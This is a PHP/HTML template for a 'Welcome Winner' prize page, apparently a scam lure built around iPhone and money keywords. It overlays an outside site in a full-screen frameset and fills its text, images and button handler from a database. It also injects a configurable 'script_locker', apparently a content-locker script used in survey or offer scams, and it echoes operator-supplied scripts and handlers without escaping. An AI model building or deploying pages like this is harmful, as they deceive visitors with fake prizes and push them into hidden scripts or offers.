<!doctype html>
<html lang="en">

<?php $data = $data[0]; ?>

<head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <!-- Bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">

    <title><?= $data['title']; ?></title>

    <meta name="description" content="Welcome Winner" />
    <meta name="keywords" content="winner, prize, money,iphone 15, iphone 14" />

    <?php if (!empty($data['custom_css'])) :
        $style = "<style>";
        $style .= $data['custom_css'];
        $style .= "</style>";
        echo $style;
    endif; ?>
</head>

<body>
    <frameset border="0" rows="100%,*" cols="100%" frameborder="no">
        <frame name="TopFrame" scrolling="yes" noresize src="http://nvireview.com">
            <frame name="BottomFrame" scrolling="no" noresize>
                <noframes></noframes>
    </frameset>
    <section class="container">
        <div class="row mt-5 pt-2 text-center">
            <div class="col-md-12 mb-2">
                <div class="available-formats"><b>
                        <font color="black">SELECT YOUR LANGUAGE :</font>
                    </b></div>
                <div id="google_translate_element"></div>
            </div>
            <div class="col-md-12 mb-2">
                <h4><?= $data['text_header']; ?></h4>
                <img class="img" style="width: 300px;" src="<?= $data['gambar_header']; ?>" alt="">
            </div>
            <div class="col-md-12 mb-2">
                <?= $data['text_body']; ?>
                <?php if ($data['btn_type'] == 'btn') : ?>
                    <button type="button" onclick='<?= $data['btn_onclick']; ?>' class="<?= $data['btn_class']; ?>"><?= $data['btn_name']; ?></button><br>
                <?php else : ?>
                    <a href="<?= $data['btn_link']; ?>" target="<?= $data['btn_target']; ?>" class="<?= $data['btn_class']; ?>"><?= $data['btn_name']; ?></a><br>
                <?php endif; ?>
            </div>
            <div class="col-md-12 mb-2">
                <img class="img-fluid mt-1" style="width: 320px;" src="<?= $data['gambar_footer']; ?>" alt="">
            </div>
            <div class="col-md-12">
                <div class="fotter__offer"><?= $data['text_footer']; ?></div>
            </div>
        </div>
    </section>

    <!-- Optional JavaScript; choose one of the two! -->

    <!-- Option 1: Bootstrap Bundle with Popper -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>

    <!-- Option 2: Separate Popper and Bootstrap JS -->
    <!--
    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.2/dist/umd/popper.min.js" integrity="sha384-IQsoLXl5PILFhosVNubq5LC7Qb9DXgDA9i+tQ8Zj3iwWAwPtgFTxbJ8NT4GN1R8p" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.min.js" integrity="sha384-cVKIPhGWiC2Al4u+LWgxfKTRIcfu0JTxR+EQDz/bgldoEyl4H0zUF0QKbrJ0EcQF" crossorigin="anonymous"></script>
    -->
    <script type="text/javascript">
        function googleTranslateElementInit() {
            new google.translate.TranslateElement({
                pageLanguage: 'en',
                layout: google.translate.TranslateElement.InlineLayout.VERTIKAL
            }, 'google_translate_element');
        }
    </script>
    <script type="text/javascript" src="https://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>

    <?= $data['script_locker']; ?>

    <?php
    // echo histats_code()
    ?>
</body>

</html>